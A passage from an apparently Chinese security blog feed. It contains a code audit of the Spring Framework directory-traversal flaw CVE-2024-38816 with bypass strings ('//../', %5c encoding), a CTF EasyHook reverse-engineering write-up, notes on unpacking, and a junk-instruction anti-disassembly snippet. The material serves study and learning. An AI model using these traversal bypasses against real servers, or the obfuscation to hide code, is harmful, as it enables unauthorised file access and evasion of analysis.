class="string">&quot;/&quot;</span> + path.substring(i) : path.substring(i);</span><br><span class="line">                <span class="keyword">return</span> path;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果路径仅包含斜杠，返回斜杠或空字符串</span></span><br><span class="line">        <span class="keyword">return</span> (slash ? <span class="string">&quot;/&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检查路径是否无效，防止访问受限制的目录或进行路径穿越攻击。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> path 需要检查的路径字符串。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果路径无效则返回 true，否则返回 false。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isInvalidPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="comment">// 禁止访问 WEB-INF 和 META-INF 目录</span></span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;WEB-INF&quot;</span>) || path.contains(<span class="string">&quot;META-INF&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查是否包含协议或 URL 前缀，防止绝对路径访问</span></span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;:/&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">relativePath</span> <span class="operator">=</span> (path.charAt(<span class="number">0</span>) == <span class="string">&#x27;/&#x27;</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">            <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">&quot;url:&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查路径是否包含路径穿越序列</span></span><br><span class="line">        <span class="keyword">return</span> path.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检查资源是否位于基础位置下，防止路径穿越。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource 需要检查的资源。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果资源位于基础位置下则返回 true，否则返回 false。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果读取资源路径时发生 IO 异常。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isResourceUnderLocation</span><span class="params">(Resource resource)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 确保资源类型与基础位置一致</span></span><br><span class="line">        <span class="keyword">if</span> (resource.getClass() != <span class="built_in">this</span>.location.getClass()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String resourcePath;</span><br><span class="line">        String locationPath;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据资源类型获取路径</span></span><br><span class="line">        <span class="keyword">if</span> (resource <span class="keyword">instanceof</span> UrlResource) &#123;</span><br><span class="line">            resourcePath = resource.getURL().toExternalForm();</span><br><span class="line">            locationPath = StringUtils.cleanPath(<span class="built_in">this</span>.location.getURL().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (resource <span class="keyword">instanceof</span> ClassPathResource classPathResource) &#123;</span><br><span class="line">            resourcePath = classPathResource.getPath();</span><br><span class="line">            locationPath = StringUtils.cleanPath(((ClassPathResource) <span class="built_in">this</span>.location).getPath());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            resourcePath = resource.getURL().getPath();</span><br><span class="line">            locationPath = StringUtils.cleanPath(<span class="built_in">this</span>.location.getURL().getPath());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果资源路径与基础位置路径相同，返回 true</span></span><br><span class="line">        <span class="keyword">if</span> (locationPath.equals(resourcePath)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 确保基础位置路径以斜杠结尾</span></span><br><span class="line">        locationPath = (locationPath.endsWith(<span class="string">&quot;/&quot;</span>) || locationPath.isEmpty() ? locationPath : locationPath + <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="comment">// 检查资源路径是否以基础位置路径开头</span></span><br><span class="line">        <span class="keyword">if</span> (!resourcePath.startsWith(locationPath)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 确保资源路径不包含路径穿越序列</span></span><br><span class="line">        <span class="keyword">return</span> !resourcePath.contains(<span class="string">&quot;%&quot;</span>) ||</span><br><span class="line">                !StringUtils.uriDecode(resourcePath, StandardCharsets.UTF_8).contains(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回对象的字符串表示，包含路径模式和资源位置。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 对象的字符串表示。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.pattern + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在代码中有StringUtils.cleanPath(path).contains(“..&#x2F;“)去检查目录穿越，继续跟踪cleanPath方法，这个方法用来处理路径中的反斜杠、斜杠、不必要的当前目录符号(.)、上级目录符号(..)等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">cleanPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果路径为空或长度为0，直接返回原路径</span></span><br><span class="line">    <span class="keyword">if</span> (!hasLength(path)) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String normalizedPath;</span><br><span class="line">    <span class="comment">// 优化处理：如果路径中包含反斜杠（\），则进行替换</span></span><br><span class="line">    <span class="keyword">if</span> (path.indexOf(<span class="string">&#x27;\\&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 将双反斜杠替换为单一的文件夹分隔符（通常为 /）</span></span><br><span class="line">        normalizedPath = replace(path, DOUBLE_BACKSLASHES, FOLDER_SEPARATOR);</span><br><span class="line">        <span class="comment">// 将 Windows 特有的文件夹分隔符（\）替换为统一的文件夹分隔符（/）</span></span><br><span class="line">        normalizedPath = replace(normalizedPath, WINDOWS_FOLDER_SEPARATOR, FOLDER_SEPARATOR);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果没有反斜杠，直接使用原路径</span></span><br><span class="line">        normalizedPath = path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">pathToUse</span> <span class="operator">=</span> normalizedPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 快捷方式：如果路径中不包含点（.），则无需进一步处理，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (pathToUse.indexOf(<span class="string">&#x27;.&#x27;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pathToUse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理路径前缀（例如 &quot;file:&quot;），以避免将其作为路径的一部分进行解析</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">prefixIndex</span> <span class="operator">=</span> pathToUse.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (prefixIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 提取前缀（例如 &quot;file:&quot;）</span></span><br><span class="line">        prefix = pathToUse.substring(<span class="number">0</span>, prefixIndex + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 如果前缀中包含文件夹分隔符，说明前缀不合法，忽略前缀</span></span><br><span class="line">        <span class="keyword">if</span> (prefix.contains(FOLDER_SEPARATOR)) &#123;</span><br><span class="line">            prefix = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 移除前缀部分，保留后面的路径进行处理</span></span><br><span class="line">            pathToUse = pathToUse.substring(prefixIndex + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果路径以文件夹分隔符开头，保留分隔符并移除路径开头的分隔符</span></span><br><span class="line">    <span class="keyword">if</span> (pathToUse.startsWith(FOLDER_SEPARATOR)) &#123;</span><br><span class="line">        prefix = prefix + FOLDER_SEPARATOR;</span><br><span class="line">        pathToUse = pathToUse.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将路径按文件夹分隔符拆分为数组</span></span><br><span class="line">    <span class="comment">// private static final String FOLDER_SEPARATOR = &quot;/&quot;;</span></span><br><span class="line">    String[] pathArray = delimitedListToStringArray(pathToUse, FOLDER_SEPARATOR);</span><br><span class="line">    <span class="comment">// 使用双端队列（Deque）来存储处理后的路径元素</span></span><br><span class="line">    Deque&lt;String&gt; pathElements = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;(pathArray.length);</span><br><span class="line">    <span class="type">int</span> <span class="variable">tops</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 记录 &quot;..&quot; 的数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从路径数组的最后一个元素开始逆序遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> pathArray.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">element</span> <span class="operator">=</span> pathArray[i];</span><br><span class="line">        <span class="keyword">if</span> (CURRENT_PATH.equals(element)) &#123;</span><br><span class="line">            <span class="comment">// 当前目录（.）无需处理，直接跳过</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TOP_PATH.equals(element)) &#123;</span><br><span class="line">            <span class="comment">// 遇到上一级目录（..），增加 tops 计数</span></span><br><span class="line">            tops++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (tops &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果有待消除的上一级目录，减少 tops 计数，忽略当前元素</span></span><br><span class="line">                tops--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 正常的路径元素，添加到队列的前面</span></span><br><span class="line">                pathElements.addFirst(element);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果处理后的路径元素数量与原数组相同，说明没有需要清理的部分，直接返回规范化后的路径</span></span><br><span class="line">    <span class="keyword">if</span> (pathArray.length == pathElements.size()) &#123;</span><br><span class="line">        <span class="keyword">return</span> normalizedPath;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保留剩余的上一级目录（..）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tops; i++) &#123;</span><br><span class="line">        pathElements.addFirst(TOP_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果队列中只有一个空元素，并且前缀不以文件夹分隔符结尾，添加当前目录（.）</span></span><br><span class="line">    <span class="keyword">if</span> (pathElements.size() == <span class="number">1</span> &amp;&amp; pathElements.getLast().isEmpty() &amp;&amp; !prefix.endsWith(FOLDER_SEPARATOR)) &#123;</span><br><span class="line">        pathElements.addFirst(CURRENT_PATH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将队列中的路径元素重新连接为字符串，使用文件夹分隔符作为分隔符</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">joined</span> <span class="operator">=</span> collectionToDelimitedString(pathElements, FOLDER_SEPARATOR);</span><br><span class="line">    <span class="comment">// 如果有前缀，则将前缀与连接后的路径组合，否则直接返回连接后的路径</span></span><br><span class="line">    <span class="keyword">return</span> prefix.isEmpty() ? joined : prefix + joined;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该漏洞原理与CVE-2018-1271 Spring MVC的穿越漏洞原理一致，由于String[] pathArray &#x3D; delimitedListToStringArray(pathToUse, FOLDER_SEPARATOR);的方法会将&#x2F;&#x2F;当成⼀个目录，而FileSystem不会把&#x2F;&#x2F;当成一个目录</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924101504489.png" alt="image-20240924101504489"></p><p>做一下测试，发现解析处理的路径确实不一样</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924103139013.png" alt="image-20240924103139013"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924103155246.png" alt="image-20240924103155246"></p><p>bypass：</p><p>利用上面的原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//../ 穿越1级目录</span><br><span class="line">///../../ 穿越2级目录</span><br></pre></td></tr></table></figure><p>但由于processPath方法处理不能出现连续的&#x2F;需要使用\反斜杠进行分割，但由于url不能出现\反斜杠，所以用url编码%5c进行绕过</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924104820926.png" alt="image-20240924104820926"></p><p>成功绕过processPath对多个&#x2F;的限制</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924104943838.png" alt="image-20240924104943838"></p><p>最终的payload</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091755049.png" alt="image-20240924091755049"></p>]]></content>
    
    
    <summary type="html">spring-framework目录遍历漏洞（cve-2024-38816）代码审计</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF-REVERSE-EASYHOOK-Writeup</title>
    <link href="http://example.com/posts/4044079439.html"/>
    <id>http://example.com/posts/4044079439.html</id>
    <published>2024-09-18T11:13:46.000Z</published>
    <updated>2024-10-25T07:09:20.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EasyHook"><a href="#EasyHook" class="headerlink" title="EasyHook"></a>EasyHook</h1><p>攻防世界Reverse三星题EASYHOOK Wirteup</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>IDA F5看下main函数伪代码</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240918191658086.png" alt="image-20240918191658086"></p><p>代码中的两个关键部分，输入字符串长度&#x3D;19，让NumberOfBytesWritten&#x3D;1</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922220946414.png" alt="image-20240922220946414"></p><p>但是根据前面WriteFile的Windows API，NumberOfBytesWritten的值为写入的字节数，我们输入的Buffer长度必须为19，NumberOfBytesWritten也为19肯定不能为1，这个条件冲突了，在之前的过程中肯定有东西可以修改这个NumberOfBytesWritten的值</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922221140896.png" alt="image-20240922221140896"></p><p>继续看下前面的函数，sub_401240看起来像一个算法，先放着等待进一步分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401240(Buffer, &amp;NumberOfBytesWritten);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922221355659.png" alt="image-20240922221355659"></p><p>sub_401220()，这个函数先调用GetProcAddres获取了WriteFile函数的地址lpAdress，再去Hook这个WriteFIle的函数</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922221617459.png" alt="image-20240922221617459"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922221723398.png" alt="image-20240922221723398"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922221743971.png" alt="image-20240922221743971"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922222846999.png" alt="image-20240922222846999"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922222908048.png" alt="image-20240922222908048"></p><p>分析过后该函数被修改为</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922223650294.png" alt="image-20240922223650294"></p><p>再继续看新的WriteFile的Hook后的函数</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922223919435.png" alt="image-20240922223919435"></p><p>其中sub_401140为UninstallHook，否则再调用WriteFile函数会陷入死循环</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922224128618.png" alt="image-20240922224128618"></p><p>上面还有个函数sub_401000为Hook部分加密算法内容</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922224401672.png" alt="image-20240922224401672"></p><p>先对该函数的传参类型内容进行修改，其中有两个条件能使nNumberOfBytesToWrite返回1，反回1则v5不等于0，则*lpNumberOfBytesWritten &#x3D; 1，根据前面分析则判定输入了正确的flag</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922224628758.png" alt="image-20240922224628758"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922225804708.png" alt="image-20240922225804708"></p><p>第一个条件，不可能实现，因为nNumberOfBytesToWrite长度需要等于19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( nNumberOfBytesToWrite &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>第二个条件，需要和这个数组相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( byte_40A030[v5] == Buffer[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= nNumberOfBytesToWrite )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922224900630.png" alt="image-20240922224900630"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922224922938.png" alt="image-20240922224922938"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922225246234.png" alt="image-20240922225246234"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsigned char byte_40A030[19] = &#123;</span><br><span class="line">    0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F, 0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, </span><br><span class="line">    0x6D, 0x4C, 0x6E</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>借助AI编写算法的逆算法，成功获得flag</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922232425549.png" alt="image-20240922232425549"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240922232453028.png" alt="image-20240922232453028"></p>]]></content>
    
    
    <summary type="html">CTF-REVERSE-EASYHOOK-Writeup</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习软件脱壳技术</title>
    <link href="http://example.com/posts/3027328594.html"/>
    <id>http://example.com/posts/3027328594.html</id>
    <published>2024-09-14T10:18:02.000Z</published>
    <updated>2024-10-25T07:09:20.719Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向学习软件脱壳技术"><a href="#逆向学习软件脱壳技术" class="headerlink" title="逆向学习软件脱壳技术"></a>逆向学习软件脱壳技术</h1><p>第一步找：OEP（orginal entry point）入口点</p><p>一般都会先pushad 保存寄存器</p><p>找popad：</p><p>方式一：</p><p>F8单步执行 &#x3D;》ESP内存 数据窗口中跟随</p><p>&#x3D;》上面8字节寄存器内容打硬件断点 硬件访问word&#x2F;dword</p><p>&#x3D;》F9 popad</p><p>&#x3D;》F8单步</p><p>&#x3D;》分析 分析代码</p><p>方式二 ：</p><p>CPU寄存器窗口，ESP右键HW break</p><p>方式三：</p><p>直接搜索popad 暴力搜索popad机器码0x61</p><p>dump：</p><p>loadPE</p><p>OD脱壳调试进程</p><p>起始地址：真正的加载基地址 PE头文件</p><p>起始地址+入口点地址&#x3D;EIP值</p><p>起始地址：9A0000</p><p>入口点地址：009B816F-9A0000&#x3D;1816F</p><p>二次断点法找OEP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text .data .rdata .rsrc .reloc </span><br></pre></td></tr></table></figure><p>先给.rsrc资源节页面下内存访问断点F9运行</p><p>解压到资源节会断下，前面.text已经完成解压缩</p><p>再给代码节.text节下内存访问断点F9</p><p>外壳工作完成以后，切回OEP执行时触发内存访问断点，停在OEp</p><p>给整个节下断点</p><p>memory内存窗口F2下断点.radata</p><p>SFX找OEP：</p><p>调试选项：字节方式跟踪真正入口</p><p>最后一次异常法：</p><p>壳防止分析会抛出一些异常进行干扰，直到把流程交给OEP</p><p>定位到最后一次异常离OEP就不远了</p><p>执行2次，第一次计算异常次数比如10</p><p>第2次，停在第10次异常找到OEP</p><p>插件异常计算器</p><p>通过OEP附近函数倒退OEP：</p><p>GetVersion函数</p><p>跨段转移指令找OEP：</p><p>外壳解压缩完成会通过jmp或retn等指令跳转到程序原来的OEP .text</p><p>会跨段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、ESP定律法（堆栈平衡）</span><br><span class="line">2、直接搜索popad（堆栈平衡）</span><br><span class="line">3、二次断点法</span><br><span class="line">4、SFX（自解压分析）</span><br><span class="line">5、最后一次异常法</span><br><span class="line">6、OEP附近函数下断倒推</span><br><span class="line">7、跨段转移指令</span><br><span class="line">8、单步跟踪法、根据特征寻找</span><br></pre></td></tr></table></figure><p>导入表问题：</p><p>导入表在某个节里面，加壳时导入表被破坏</p><p>除了各个节压缩，还需要构建新的导入表出来</p><p>外壳模仿加载器加DLL</p><p>找IAT，通过IAT调用外部函数时，call dword ptr或者jmp dword ptr</p><p>dump时，勾选重建输入表</p><p>ImportREC工具导入表</p><p>默认加载地址随机化</p><p>重定位表，dump出来PE文件加载基地址不一样</p><p>1、编译随机地址关掉</p><p>2、StudyPE 固定PE基址 （改PE文件可选头）</p><p>3、dump时重定向表也构建 ReloX 运行两次compare对比</p>]]></content>
    
    
    <summary type="html">逆向学习软件脱壳技术</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习-SMC和花指令</title>
    <link href="http://example.com/posts/290788003.html"/>
    <id>http://example.com/posts/290788003.html</id>
    <published>2024-09-11T05:01:14.000Z</published>
    <updated>2024-10-25T07:09:20.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向学习-SMC和花指令"><a href="#逆向学习-SMC和花指令" class="headerlink" title="逆向学习-SMC和花指令"></a>逆向学习-SMC和花指令</h1><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>动态保护：</p><p>反调试、反虚拟机</p><p>静态保护：</p><p>花指令、加密、加壳、混淆</p><p>反汇编原理：</p><p>线性扫描</p><p>递归行进算法</p><p>增加__declspec(naked)，汇编指令只有这些</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">test eax, eax</span><br><span class="line">jmp label1</span><br><span class="line">__emit <span class="number">0xe9</span></span><br><span class="line">label1:</span><br><span class="line">pop eax</span><br><span class="line">mov ebx, <span class="number">1</span></span><br><span class="line">add eax, ebx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0xe9是跳转指令，__emit 0xe9强行插入，在线性扫描时会错误识别，起到静态保护作用，递归行进算法能正常识别</p><p>成果骗过VS</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240911191900217.png" alt="image-20240911191900217"></p><p>IDA递归行进算法未骗过</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240911192213690.png" alt="image-20240911192213690"></p><p>IDA为递归行进算法，会到不同的分支，使用jz、jnz成功骗过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 